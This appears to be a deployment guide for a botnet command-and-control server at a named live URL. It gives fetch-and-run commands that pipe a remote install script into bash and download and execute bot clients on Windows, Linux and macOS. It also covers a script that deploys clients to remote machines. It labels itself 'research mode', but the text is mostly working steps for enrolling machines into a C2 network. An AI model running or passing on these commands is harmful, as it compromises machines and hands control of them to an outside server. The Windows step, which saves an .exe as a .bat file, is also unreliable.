# 🚀 Quick Client Deployment Guide

Your C2 server is live at **https://botnet-xdio.onrender.com/** - let's deploy clients!

## ⚡ One-Command Deployments

### **Deploy on Current Machine**
```bash
# Auto-detect platform and deploy
curl -s https://botnet-xdio.onrender.com/install | bash
```

### **Download Specific Platform**

**Windows:**
```powershell
# Download Windows client
curl -L https://botnet-xdio.onrender.com/download/client-windows.exe -o bot-client.bat

# Run client
./bot-client.bat
```

**Linux:**
```bash
# Download Linux client
wget https://botnet-xdio.onrender.com/download/client-linux -O bot-client

# Make executable and run
chmod +x bot-client
./bot-client
```

**macOS:**
```bash
# Download macOS client
curl -L https://botnet-xdio.onrender.com/download/client-macos -o bot-client

# Make executable and run
chmod +x bot-client
./bot-client
```

## 🎯 Using the Deployment Script

```bash
# Make deployment script executable
chmod +x client-deployment/deploy-to-live-server.sh

# Deploy on local machine
./client-deployment/deploy-to-live-server.sh local

# Deploy to remote machine
./client-deployment/deploy-to-live-server.sh remote 192.168.1.100

# Check status
./client-deployment/deploy-to-live-server.sh status

# Emergency stop all clients
./client-deployment/deploy-to-live-server.sh stop
```

## 📊 Live Dashboard Access

- **Main Dashboard**: https://botnet-xdio.onrender.com/
- **API Status**: https://botnet-xdio.onrender.com/api/status
- **Health Check**: https://botnet-xdio.onrender.com/health

## 🤖 What the Clients Do

The clients will:
- ✅ **Connect to your live C2 server** at https://botnet-xdio.onrender.com
- ✅ **Report as active bots** in your dashboard
- ✅ **Send periodic heartbeats** every 30 seconds
- ✅ **Run in research mode** with ethical controls
- ✅ **Show up in the Bot Management** tab

## 🔍 Monitor Your Deployment

1. **Go to**: https://botnet-xdio.onrender.com/
2. **Click**: "Bot Management" tab
3. **See**: Connected clients appear in the table
4. **Watch**: Real-time statistics update in Dashboard tab

## ⚠️ Important Notes

- 🔬 **Research Mode Only**: All clients run with ethical controls
- 📝 **Activity Logged**: All connections and commands are logged
- 🛡️ **Safe Testing**: Only deploy on systems you own or have permission to test
- 🚨 **Emergency Stop**: Use the emergency stop feature if needed

## 🎉 You're Ready!

Your C2 server is live and ready to accept client connections. Deploy clients using any of the methods above and watch them appear in your dashboard! 🎯
